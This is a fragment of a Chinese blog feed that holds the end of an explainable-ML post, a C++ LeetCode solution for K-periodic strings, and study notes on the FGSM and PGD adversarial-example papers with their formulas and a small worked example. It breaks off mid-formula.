src="/post/e4cc0182/e4cc0182/172707213426919.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427020.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427021.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427022.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427023.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427024.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427025.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427026.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427027.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427128.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427129.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427130.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427131.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427132.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427133.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427134.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427135.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427136.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427137.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427238.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427239.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427240.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427241.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427242.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427243.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427244.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427245.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427246.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427247.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427248.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427249.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427350.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427351.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427352.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427353.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427354.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427355.png" class title="img"><img src="/post/e4cc0182/e4cc0182/172707213427356.png" class title="img"><p>实验结果如下图</p><p><img src="/post/e4cc0182/172707213427357.png" alt="img" style="zoom:50%;"></p><p>实验结果：不进行采样获取到的结果随着迭代次数增加效果越来越差，在最后几乎保持不变</p><p>进行采样和随机化后的结果准确率迅速达到饱和，且很高</p><p><strong>原因：</strong>1. 随机性的引入 2.后期变化小，不再进行优化</p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;explainable-ml&quot;&gt;Explainable ML&lt;/h4&gt;
&lt;p&gt;产生原因：预测正确 !=
模型有效，即&lt;strong&gt;希望模型能给出预测结果的支撑原因&lt;/strong&gt;，深度神经网络对我们是一个黑盒结构，不能直接解释其结果&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>leetcode-daily-practice</title>
    <link href="http://example.com/post/374aa791.html"/>
    <id>http://example.com/post/374aa791.html</id>
    <published>2024-08-18T02:04:22.000Z</published>
    <updated>2024-09-28T16:17:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>学习之路任重而道远</p><span id="more"></span><h4 id="k-周期字符串需要的最少操作次数"><a href="https://leetcode.cn/problems/minimum-number-of-operations-to-make-word-k-periodic/">K周期字符串需要的最少操作次数</a></h4><h5 id="题目描述">题目描述</h5><p>给你一个长度为 <code>n</code> 的字符串 <code>word</code> 和一个整数<code>k</code> ，其中 <code>k</code> 是 <code>n</code> 的因数。</p><p>在一次操作中，你可以选择任意两个下标 <code>i</code> 和<code>j</code>，其中 <code>0 &lt;= i, j &lt; n</code>，且这两个下标都可以被 <code>k</code> 整除，然后用从 <code>j</code>开始的长度为 <code>k</code> 的子串替换从 <code>i</code> 开始的长度为<code>k</code> 的子串。也就是说，将子串 <code>word[i..i + k - 1]</code>替换为子串 <code>word[j..j + k - 1]</code> 。</p><p>返回使 <code>word</code> 成为 <strong>K 周期字符串</strong> 所需的<strong>最少</strong> 操作次数。</p><p>如果存在某个长度为 <code>k</code> 的字符串 <code>s</code>，使得<code>word</code> 可以表示为任意次数连接 <code>s</code> ，则称字符串<code>word</code> 是 <strong>K 周期字符串</strong> 。例如，如果<code>word == "ababab"</code>，那么 <code>word</code> 就是<code>s = "ab"</code> 时的 2 周期字符串 。</p><p><strong>示例 1：</strong></p><p><strong>输入：</strong>word = "leetcodeleet", k = 4</p><p><strong>输出：</strong>1</p><p><strong>解释：</strong>可以选择 i = 4 和 j = 0 获得一个 4周期字符串。这次操作后，word 变为 "leetleetleet" 。</p><h5 id="思路">思路</h5><p>要点1：选择的两个下标要能被k整除，k是word长度的因数，可选择的下标为——0,k, k*2..., word.size() - k</p><p>要点2：K周期字符串要以k为周期，即我们每次选择的子串中必有一个会成为最后的循环依据</p><h5 id="方法">方法</h5><p>找到重复次数最多的长度为k的字串数量，将其他不是该字串的更换为该字串即可</p><h5 id="代码">代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumOperationsToMakeKPeriodic</span><span class="params">(string word, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;string, <span class="type">int</span>&gt; hashmap;</span><br><span class="line">        <span class="type">int</span> length = word.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">pair&lt;string, <span class="type">int</span>&gt; <span class="title">max_pair</span><span class="params">(make_pair(<span class="string">&quot;&quot;</span>, <span class="number">0</span>))</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i += k)</span><br><span class="line">            <span class="keyword">if</span>(++hashmap[word.<span class="built_in">substr</span>(i, k)] &gt; max_pair.second) max_pair=<span class="built_in">make_pair</span>(word.<span class="built_in">substr</span>(i, k), hashmap[word.<span class="built_in">substr</span>(i, k)]);</span><br><span class="line">        <span class="keyword">return</span> length / k - max_pair.second;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="section"></h4>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习之路任重而道远&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="c" scheme="http://example.com/tags/c/"/>
    
    <category term="c++" scheme="http://example.com/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>FGSM &amp; PDG</title>
    <link href="http://example.com/post/cda691ed.html"/>
    <id>http://example.com/post/cda691ed.html</id>
    <published>2024-07-02T08:20:29.000Z</published>
    <updated>2024-09-28T16:17:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="fgsm">FGSM</h2><p>论文链接： [<a href="https://arxiv.org/abs/1412.6572">1412.6572]Explaining and Harnessing Adversarial Examples (arxiv.org)</a>[<a href="https://arxiv.org/abs/1412.6572">1412.6572] Explaining andHarnessing Adversarial Examples (arxiv.org)</a></p><h4 id="研究点">研究点</h4><p>设计更强大的优化方法，能够在训练过程中有效处理非线性模型的复杂性，从而同时实现训练的易用性和对抗性扰动的抵抗能力</p><span id="more"></span><h4 id="线性模型中的对抗扰动">线性模型中的对抗扰动</h4><ol type="1"><li><strong>对抗扰动的累积效应</strong>：<ul><li>假设我们有一个输入向量 <span class="math inline">\(x\)</span>和一个权重向量 <span class="math inline">\(w\)</span>。</li><li>我们施加一个微小的扰动 <span class="math inline">\(η\)</span>到输入向量 <span class="math inline">\(x\)</span>，得到新的输入 <span class="math inline">\(\tilde{x}=x+\eta.\)</span>。</li></ul></li><li><strong>权重向量和扰动的点积</strong>：<ul><li>对于线性模型，激活值是通过计算权重向量 <span class="math inline">\(w\)</span> 和输入向量 <span class="math inline">\(x\)</span> 的点积得到的，即<span class="math inline">\(\boldsymbol{w}^\top\tilde{\boldsymbol{x}}=\boldsymbol{w}^\top\boldsymbol{x}+\boldsymbol{w}^\top\boldsymbol{\eta}\)</span>。</li><li>这里 <span class="math inline">\(w^\topx\)</span>是原始激活值，而<span class="math inline">\(w^\topn\)</span>是由扰动引起的激活值变化。</li></ul></li><li><strong>最大化扰动的影响</strong>：<ul><li>为了使激活值变化<span class="math inline">\(w^\topn\)</span>最大化，可以将 <span class="math inline">\(η\)</span> 设置为<span class="math inline">\(\mathrm{sign}(w)\)</span>，即 <span class="math inline">\(η\)</span> 的每个元素的符号与 <span class="math inline">\(w\)</span> 的对应元素相同。</li><li>这种设置会使得点积 <span class="math inline">\(w^\top n\)</span>取得最大值。</li></ul></li><li><strong>累积效应</strong>：<ul><li>如果权重向量 <span class="math inline">\(w\)</span> 有 <span class="math inline">\(n\)</span> 个维度，每个元素的平均值为 <span class="math inline">\(m\)</span>，那么总的激活值变化为<span class="math inline">\(\epsilon mn\)</span>。</li><li>这是因为每个小的扰动 <span class="math inline">\(n\)</span>的元素都被放大了 <span class="math inline">\(m\)</span> 倍，并且有 <span class="math inline">\(n\)</span> 个这样的元素。</li></ul></li><li><strong>高维度的影响</strong>：<ul><li>由于 <span class="math inline">\(η\)</span> 的最大范数<span class="math inline">\(\|\eta\|_{\infty}\)</span>是固定的（即每个元素的最大值是固定的），不会随着维度<span class="math inline">\(n\)</span>增加而增加。</li><li>但是，由于<span class="math inline">\(n\)</span>增加，累积效应使得总的激活值变化<span class="math inline">\(w^\top n\)</span>可以线性增加。</li></ul></li><li><strong>意外隐写术</strong>：<ul><li>这种现象类似于隐写术，即通过许多小的变化隐藏一个大的变化。</li><li>线性模型会被迫专注于最符合其权重的信号，即使输入数据中存在多个信号且其他信号的幅度更大。</li></ul></li></ol><h4 id="非线性模型的线性特性">非线性模型的线性特性</h4><p>非线性模型被有意设计为以非常线性的方式运行</p><h5 id="lstm长短期记忆网络">LSTM（长短期记忆网络）</h5><h6 id="公式和结构">公式和结构：</h6><p>LSTM单元由以下主要部分组成：</p><ul><li><strong>输入门</strong>：控制有多少新信息被写入记忆单元。</li><li><strong>遗忘门</strong>：控制有多少记忆单元中的信息被保留。</li><li><strong>输出门</strong>：控制有多少信息从记忆单元输出。</li></ul><p>LSTM单元的公式如下：</p><p><span class="math inline">\(\begin{aligned}&amp;i_t=\sigma(W_i\cdot[h_{t-1},x_t]+b_i) \\&amp;f_t=\sigma(W_f\cdot[h_{t-1},x_t]+b_f) \\&amp;o_t=\sigma(W_o\cdot[h_{t-1},x_t]+b_o) \\&amp;\tilde{C}_t=\tanh(W_C\cdot[h_{t-1},x_t]+b_C) \\&amp;C_t=f_t\cdot C_{t-1}+i_t\cdot\tilde{C}_t \\&amp;h_t=o_t\cdot\tanh(C_t)\end{aligned}\)</span></p><p>其中：</p><ul><li><span class="math inline">\(σ\)</span> 是sigmoid函数，输出范围在(0,1)之间。</li><li><span class="math inline">\(⁡tanh\)</span> 是tanh函数，输出范围在(-1,1)之间。</li><li><span class="math inline">\(i_t\)</span>、<span class="math inline">\(f_t\)</span>、<span class="math inline">\(o_t\)</span>分别是输入门、遗忘门和输出门的激活值。</li><li><span class="math inline">\(C_t\)</span> 是记忆单元的状态。</li><li><span class="math inline">\(h_t\)</span> 是隐藏状态。</li></ul><h6 id="线性特性">线性特性：</h6><ul><li><strong>门控机制</strong>：LSTM通过输入门、遗忘门和输出门控制信息的流动，这些门的输出是线性的（在0到1之间）。这种设计使得信息在较长时间内保持稳定，梯度传递时不会消失或爆炸，从而表现得更为线性。</li></ul><h5 id="relu整流线性单元">ReLU（整流线性单元）</h5><h6 id="公式和特性">公式和特性：</h6><p>ReLU的激活函数定义为： <span class="math inline">\(𝑓(𝑥)=max⁡(0,𝑥)\)</span></p><h6 id="线性特性-1">线性特性：</h6><ul><li><strong>线性部分</strong>：当输入 <span class="math inline">\(𝑥≥0\)</span> 时，ReLU的输出是 <span class="math inline">\(x\)</span>，即线性关系；当输入 <span class="math inline">\(𝑥&lt;0\)</span>时，输出为0。这使得在大部分情况下，ReLU的输出是线性的，尤其是在正区间内。</li><li><strong>避免梯度消失</strong>：与sigmoid和tanh等激活函数相比，ReLU的正区间内梯度为1，不会出现梯度消失的问题，使得优化过程更加高效。</li></ul><h5 id="maxout网络">Maxout网络</h5><h6 id="公式和特性-1">公式和特性：</h6><p>Maxout单元输出若干线性函数的最大值，具体公式为：</p><p><span class="math inline">\(f(x)=\max(w_1^\top x+b_1,w_2^\topx+b_2,\ldots,w_k^\top x+b_k)\)</span></p><p>其中：</p><ul><li><span class="math inline">\(w_i\)</span>和 <span class="math inline">\(b_i\)</span> 是可学习的参数。</li><li><span class="math inline">\(k\)</span>是Maxout单元的线性函数数量。</li></ul><h6 id="线性特性-2">线性特性：</h6><ul><li><strong>线性组合</strong>：Maxout通过输出多个线性函数中的最大值，实现在局部线性化的非线性映射。这种设计使得每个Maxout单元在一小段范围内是线性的。</li><li><strong>增强非线性表达能力</strong>：虽然Maxout单元在局部是线性的，但通过组合多个线性函数，整体上可以实现复杂的非线性映射，同时保持优化的稳定性。</li></ul><h4 id="初始fgsm">初始FGSM</h4><p>快速梯度符号法 —— 生成对抗样本</p><ol type="1"><li><strong>符号说明</strong>：<ul><li><span class="math inline">\(θ\)</span>：模型的参数。</li><li><span class="math inline">\(𝑥\)</span>：模型的输入。</li><li><span class="math inline">\(𝑦\)</span>：与 <span class="math inline">\(𝑥\)</span>相关联的目标（对于有目标的机器学习任务）。</li><li><span class="math inline">\(𝐽(𝜃,𝑥,𝑦)\)</span>：用于训练神经网络的损失函数（成本函数）。</li></ul></li><li><strong>线性化损失函数</strong>：<ul><li>我们可以在当前参数 <span class="math inline">\(𝜃\)</span>的值附近对损失函数 <span class="math inline">\(𝐽(𝜃,𝑥,𝑦)\)</span>进行线性化处理，以获得一个最佳的最大范数约束扰动。</li></ul></li><li><strong>生成对抗扰动</strong>：<ul><li>对抗扰动 <span class="math inline">\(𝜂\)</span> 可以表示为： <span class="math inline">\(𝜂=𝜖 *\mathrm{sign}(\nabla_xJ(\theta,x,y))\)</span></li><li>其中，<span class="math inline">\(𝜖\)</span>是一个小的常数，用于控制扰动的大小。</li><li><span class="math inline">\(\nabla_xJ(\theta,x,y)\)</span>表示损失函数对输入 <span class="math inline">\(𝑥\)</span> 的梯度。</li><li>sign(⋅)sign(⋅) 是符号函数，表示取梯度中每个元素的符号（正为 +1，负为-1）。</li></ul></li><li><strong>快速梯度符号法（FGSM）</strong>：<ul><li>这种方法被称为快速梯度符号法，用于生成对抗样本。</li><li>通过反向传播算法，可以高效地计算所需的梯度。</li></ul></li></ol><h5 id="具体实例">具体实例</h5><p>假设有一个简单的神经网络模型用于图像分类，输入 <span class="math inline">\(𝑥\)</span> 是一个手写数字图片，目标 <span class="math inline">\(y\)</span>是图片对应的数字（比如3）。</p><ol type="1"><li><strong>模型参数和损失函数</strong>：<ul><li>模型的参数 <span class="math inline">\(θ\)</span>包括权重和偏置。</li><li>损失函数 <span class="math inline">\(𝐽(𝜃,𝑥,𝑦)\)</span>是交叉熵损失函数，用于评估模型预测的准确性。</li></ul></li><li><strong>计算损失函数对输入的梯度</strong>：<ul><li>通过反向传播算法，我们可以计算损失函数$ 𝐽(𝜃,𝑥,𝑦)$ 对输入 <span class="math inline">\(𝑥\)</span> 的梯度<span class="math inline">\(\nabla_xJ(\theta,x,y)\)</span>。</li></ul></li><li><strong>生成对抗扰动</strong>：<ul><li>假设我们计算出的梯度为：<span class="math inline">\(\nabla_xJ(\theta,x,y)=\begin{bmatrix}-0.1&amp;0.3&amp;-0.2&amp;0.4\end{bmatrix}\)</span></li><li>使用符号函数得到： <span class="math inline">\(\mathrm{sign}(\nabla_xJ(\theta,x,y))=\begin{bmatrix}-1&amp;1&amp;-1&amp;1\end{bmatrix}\)</span></li><li>设定一个小的扰动幅度<span class="math inline">\(\epsilon=0.1\)</span>，我们得到对抗扰动：<span class="math inline">\(\eta=0.1\cdot\begin{bmatrix}-1&amp;1&amp;-1&amp;1\end{bmatrix}=\begin{bmatrix}-0.1&amp;0.1&amp;-0.1&amp;0.1\end{bmatrix}\)</span></li></ul></li><li><strong>生成对抗样本</strong>：<ul><li>我们将扰动添加到原始输入 <span class="math inline">\(𝑥\)</span>中，得到对抗样本<span class="math inline">\(\tilde{x}\)</span>：$=x+$</li></ul></li><li><strong>对抗样本的影响</strong>：<ul><li>新的对抗样本<span class="math inline">\(\tilde{x}\)</span>看起来与原始输入<span class="math inline">\(x\)</span>很相似，但由于添加了精心设计的扰动，神经网络可能会错误地分类这个对抗样本。</li></ul></li></ol><h4 id="l1正则化-vs-fgsm对抗性训练">L1正则化 vs FGSM对抗性训练</h4><h5 id="l1正则化">L1正则化</h5><ul><li>L1正则化通过在损失函数中加入权重的 L1范数（即权重的绝对值和）来控制模型的复杂度，从而避免过拟合。</li><li>损失函数为<span class="math inline">\(\mathcal{L}(w,b)+\lambda||w||_1\)</span>，其中<span class="math inline">\(\lambda\)</span>是正则化参数。通过最小化这个损失函数，模型不仅需要减少原始损失（提高准确率），还需要控制权重的绝对值之和。这会使得某些权重变得更小，甚至接近于零，从而达到减少模型复杂度、防止过拟合的目的。</li></ul><h5 id="对抗性训练">对抗性训练</h5><ul><li><p>在对抗性训练中，我们最小化的损失函数为<span class="math inline">\(\mathbb{E}_{x,y\simp_{\mathrm{data}}}\zeta(y(||w||_1-w^Tx-b))\)</span>。</p></li><li><p>这里的损失函数在训练过程中直接减去了权重的 L1范数，而不是将其加到损失函数中。这种减法会在模型信心足够高时（即$$函数饱和时）使惩罚项逐渐消失。</p><blockquote><p>这里所说的饱和指的是当模型对某个样本的预测非常自信时，<span class="math inline">\(w^Tx+b\)</span>的值使得$<span class="math inline">\(函数的输入值变得非常小，无论是正类还是负类样本，这导致\)</span><span class="math inline">\(函数的值也很小，从而使得对抗性训练中的损失变得非常小。这种情况下，惩罚项\)</span>||w||_1$对总损失的影响变得不明显，因为模型在自信的预测上已经让损失趋近于零。</p></blockquote></li></ul><h5 id="总结">总结</h5><ul><li><strong>L1正则化</strong>通过惩罚权重大小来控制模型复杂度，始终存在于损失函数中。在训练过程中将L1 惩罚项加到损失函数上，即使损失小，惩罚还是一样会增加</li><li><strong>对抗性训练</strong>通过扰动输入数据增强模型的鲁棒性，损失函数中的惩罚项会在模型足够自信时消失。对抗性训练则将其减去，损失越小，对抗性训练的惩罚越少，达到饱和，不再影响（当模型欠拟合时，对抗性训练会导致进一步欠拟合）</li></ul><h4 id="深度模型的对抗扰动">深度模型的对抗扰动</h4><blockquote><p>通用逼近定理：给定足够数量的隐藏单元和适当的权重，一个神经网络可以表示从输入到输出的几乎任何复杂关系。</p></blockquote><h5 id="对抗性训练-vs-数据增强">对抗性训练 vs 数据增强</h5><p>前者通过对抗样本直接暴露模型的弱点，使得模型在训练过程中不断改进其决策边界，变得更加鲁棒。</p><p>后者虽然能提供多样化的训练数据，但对模型潜在的脆弱性没有直接的改进效果。</p><h5 id="损失函数优化">损失函数优化</h5><p><span class="math inline">\(\tilde{J}(\boldsymbol{\theta},\boldsymbol{x},y)=\alphaJ(\boldsymbol{\theta},\boldsymbol{x},y)+(1-\alpha)J(\boldsymbol{\theta},\boldsymbol{x}+\epsilon\,\mathrm{sign}\left(\nabla_{\boldsymbol{x}}J(\boldsymbol{\theta},\boldsymbol{x},y)\right).\)</span></p><p>前半部分是模型在标准输入 <span class="math inline">\(\boldsymbol{x}\)</span>上的损失，通常用于衡量模型在干净数据上的表现</p><p>后半部分是模型在对抗样本 <span class="math inline">\(\boldsymbol{x} +\epsilon \, \mathrm{sign}\left(\nabla_{\boldsymbol{x}}J(\boldsymbol{\theta}, \boldsymbol{x}, y)\right)\)</span>上的损失。对抗样本是通过对标准输入 <span class="math inline">\(\boldsymbol{x}\)</span>进行小扰动生成的，这种扰动方向由损失函数对输入的梯度决定，目的是最大化损失。</p><p>α 控制标准损失和对抗损失的相对权重。当 <span class="math inline">\(\alpha\)</span> 接近 1 时，更加关注标准损失；当<span class="math inline">\(\alpha\)</span> 接近 0时，更加关注对抗损失。</p><h5 id="噪声添加位置选择">噪声添加位置选择</h5><ul><li>Szegedy等人的实验表明，在一个使用sigmoid激活函数的神经网络中，如果在隐藏层添加噪声，模型的正则化效果（即防止过拟合的能力）最好。</li><li>在使用快速梯度符号方法的实验中，研究人员发现，对于那些隐藏单元激活值无界的网络，隐藏单元的激活值会变得非常大。因此，通常最好只是扰动原始输入。</li><li>在饱和模型（如Rust模型）中，研究人员发现扰动输入层与扰动隐藏层的效果相当。</li><li>基于旋转隐藏层的扰动解决了无界激活值增长的问题，使得加性扰动相对较小。研究人员成功训练了带有隐藏层旋转扰动的maxout网络，但效果不如扰动输入层强。</li><li>由于神经网络的最后一层（线性- sigmoid或线性-softmax层）不是最终隐藏层函数的通用逼近器，将对抗扰动应用于最后隐藏层可能会遇到<strong>欠拟合</strong>问题。研究人员确实发现了这种效果。</li></ul><p>研究人员认为，对抗训练只有在模型<strong>有能力学习抵抗对抗样本时</strong>才明显有用。这仅在通用近似定理适用时才明显。</p><h5 id="容量低的模型表现出好性能rbf">容量低的模型表现出好性能（RBF）</h5><blockquote><p><strong>RBF（径向基函数）</strong>：一种常用的激活函数，通常用于神经网络中。RBF网络使用这些函数来将输入映射到高维空间，并进行分类或回归。假设我们有一个RBF网络用于分类任务，它的激活函数是高斯函数，表示为：<span class="math inline">\(\phi(x) = \exp(-\frac{\|x -\mu\|^2}{2\sigma^2})\)</span> 其中，<span class="math inline">\(\mu\)</span> 是中心，<span class="math inline">\(\sigma\)</span>是标准差。RBF网络会根据输入与中心的距离来计算激活值。</p></blockquote><p>由于RBF单元只对特定点有强响应，对其他点的响应较弱或没有响应，这意味着它们无法识别所有相关的正类样本，从而降低了召回率。假设RBF网络用于识别手写数字“3”。网络可能只对一些非常典型的“3”有强烈响应，但对一些稍微不同的“3”响应较弱，导致它们未被识别。</p><p>由于RBF单元在对抗样本（即故意加入扰动以欺骗模型的样本）上的表现较好，因为它们在不确定的情况下置信度较低，研究人员希望通过二次单元模型进一步提高这种鲁棒性。这类模型包括了更复杂的激活函数（例如二次函数），以更好地处理对抗样本。</p><p>在尝试使用具有足够二次抑制（即能够抵抗对抗扰动的能力）的模型时，研究人员发现这些模型在训练集上的误差很高。这意味着模型虽然在理论上能够抵抗对抗扰动，但在实际训练中表现不佳。</p><h5 id="对抗样本在不同模型之间的泛化现象">对抗样本在不同模型之间的泛化现象</h5><p>对抗样本是故意添加微小扰动，使模型做出错误预测的样本。一个为某个模型生成的对抗样本，往往也能欺骗其他模型，即使这些模型的结构不同或在不同的数据上训练过。</p><p>我们可以用“线性视角”来解释这一现象。根据这种观点，对抗样本在高维空间中形成了广泛的区域，而不是精细的点。</p><p>具体来说，只要扰动的方向和模型的损失函数梯度方向一致，并且扰动幅度足够大，就能生成对抗样本。这些样本并不是分散在精确的位置上，而是覆盖了一个较大的子空间。</p><p>研究人员假设，当前的训练方法使得神经网络在面对对抗样本时，表现得类似于一个简单的线性分类器。即使这些模型结构不同，它们学到的分类权重是相似的，这导致了对抗样本的跨模型泛化现象。</p><p>这个假设解释了一部分模型错误分类的原因，但并不能解释所有情况。</p><h2 id="pgd">PGD</h2><blockquote><p>投影梯度下降（PGD）作为通用的“一阶对手”，即利用有关网络的本地一阶信息的最强攻击。</p></blockquote><h4 id="研究点-1">研究点</h4><p>精确地了解我们想要实现的安全保证类型，即我们想要抵抗的广泛类型的攻击（与仅防御特定的已知攻击相反）</p><p>将攻击和防御纳入一个共同的理论框架中，将对抗性训练直接对应于优化</p><h4 id="pgd方法">PGD方法</h4><ol type="1"><li><p>攻击目标：PGD的目标是生成对抗性样本，即在原始输入数据 <span class="math inline">\(x\)</span> 上添加扰动 <span class="math inline">\(\delta\)</span>，使得最大化模型的损失函数 <span class="math inline">\(L(\theta, x + \delta,y)\)</span>。这个损失函数考虑了在给定模型参数 <span class="math inline">\(\theta\)</span> 下，经过扰动后的输入<span class="math inline">\(x + \delta\)</span>的预测误差。攻击者的目标是找到一个使得损失函数值最大化的扰动 <span class="math inline">\(\delta\)</span>。</p></li><li><p>扰动的约束：PGD通常会限制扰动 <span class="math inline">\(\delta\)</span>的大小，以确保生成的对抗性样本在人类感知上仍然是接近原始样本的。这种限制可以是<span class="math inline">\(\ell_p\)</span> 范数约束（如 <span class="math inline">\(\ell_\infty\)</span>范数，即扰动的每个分量都不超过某个最大值），也可以是其他形式的约束，例如在像素空间中保持每个像素值在合理范围内。</p></li><li><p>算法步骤：</p><ol type="1"><li><strong>初始化</strong>：从原始输入 <span class="math inline">\(x\)</span> 开始，设定一个初始扰动 <span class="math inline">\(\delta^{(0)}\)</span>。</li><li><strong>迭代优化</strong>：<ul><li>对于每一轮 <span class="math inline">\(t\)</span>，计算梯度 <span class="math inline">\(\nabla_\delta L(\theta, x + \delta^{(t)},y)\)</span>。</li><li>将扰动 <span class="math inline">\(\delta^{(t)}\)</span> 更新为<span class="math inline">\(\delta^{(t+1)} =\text{Clip}_{\epsilon}(\delta^{(t)} + \alpha \cdot\text{sign}(\nabla_\delta L(\theta, x + \delta^{(t)},y)))\)</span>，其中 <span class="math inline">\(\alpha\)</span>是学习率，<span class="math inline">\(\text{Clip}_{\epsilon}\)</span>表示对扰动进行约束，确保其不超过 <span class="math inline">\(\epsilon\)</span> 的范围。</li></ul></li><li><strong>终止条件</strong>：通常根据迭代次数或者达到满足某个条件的对抗性样本来决定停止迭代。</li></ol></li><li><p>优化方法：PGD通过迭代优化来找到最大化损失函数的扰动 <span class="math inline">\(\delta\)</span>，同时尽可能维持扰动的大小在合理范围内，以确保生成的对抗性样本在实际应用中具有可行性和现实意义。</p></li><li><p>结论：</p><ul><li>使用投影梯度下降（PGD）生成对抗性样本时，对抗性损失（adversarialloss）会以相当一致的方式快速增加</li><li>通过PGD优化生成的对抗性样本的损失值在多次尝试后趋于一致。这种现象暗示着损失函数的优化空间可能存在局部最大值，但这些最大值的分布是相对稳定和可预测的。</li><li>损失函数的优化空间具有一定的结构性质，即在对抗性攻击中，通过微小扰动生成的对抗性样本的损失函数是相对一致且可预测的。这也暗示了在给定条件下，攻击者可以利用这种结构来有效地生成对抗性样本。</li><li>在不同尺度的对抗性攻击中，对抗性样本的生成方式可能不仅仅依赖于梯度的正向调整，还可能涉及到更复杂的攻击策略和模型响应方式。这提示我们在设计防御策略时需要考虑更广泛和复杂的攻击场景。</li></ul><p>投影梯度下降（PGD）在所有一阶方法中可以被视为一种“通用”的对抗者。换句话说，通过观察和实验发现，PGD在对抗性攻击中表现出的效果和稳定性，使其成为所有基于一阶信息（例如梯度）的攻击方法中的一个普适选择。</p></li></ol><h2 id="原理总结">原理总结</h2><h5 id="快速梯度符号方法fgsm">1. 快速梯度符号方法（FGSM）：</h5><ul><li><strong>输入梯度计算</strong>：对于给定的输入样本 <span class="math inline">\(x\)</span>，计算其关于损失函数 <span class="math inline">\(L\)</span> 的梯度 <span class="math inline">\(\nabla_x L(\theta, x, y)\)</span>，其中 <span class="math inline">\(\theta\)</span> 是模型的参数， <span class="math inline">\(y\)</span> 是真实标签。</li><li><strong>对抗样本生成</strong>：根据梯度的方向和符号，对输入 <span class="math inline">\(x\)</span> 进行修改： <span class="math inline">\(x_{adv} = x + \epsilon \cdot \text{sign}(\nabla_xL(\theta, x, y))\)</span> 其中， <span class="math inline">\(\epsilon\)</span> 是扰动的大小或步长， <span class="math inline">\(\text{sign}(\cdot)\)</span>表示取梯度的符号。</li></ul><p>FGSM生成的对抗样本只进行一次梯度方向的扰动，因此它相对简单和高效。但由于只考虑了单步的梯度信息，生成的对抗样本可能不够健壮，容易被模型在更复杂的攻击检测中发现和修正。</p><h5 id="投影梯度下降pgd">2. 投影梯度下降（PGD）：</h5><p>PGD通过多次迭代梯度下降来生成对抗样本，以增加攻击的成功率和对抗的鲁棒性。</p><ul><li><strong>多次迭代</strong>：从原始样本 <span class="math inline">\(x\)</span> 开始，进行多轮迭代来生成对抗样本。</li><li><strong>梯度计算和投影</strong>：在每一轮迭代中，计算当前样本 <span class="math inline">\(x_t\)</span> 的梯度 <span class="math inline">\(\nabla_{x_t} L(\theta, x_t,y)\)</span>，然后将梯度方向投影到一个允许的扰动集合 <span class="math inline">\(S\)</span> 中。例如，<span class="math inline">\(S\)</span> 可以是<span class="math inline">\(\epsilon\)</span>-范数球 $ |_{} $。</li><li><strong>对抗样本更新</strong>：根据投影后的梯度方向，更新当前样本<span class="math inline">\(x_t\)</span>： <span class="math inline">\(x_{t+1} = \text{Clip}_{x, \epsilon}(x_t + \alpha\cdot \text{sign}(\nabla_{x_t} L(\theta, x_t, y)))\)</span> 其中， <span class="math inline">\(\alpha\)</span> 是学习率（步长）， <span class="math inline">\(\text{Clip}_{x, \epsilon}(\cdot)\)</span>是将结果限制在 <span class="math inline">\(x \pm 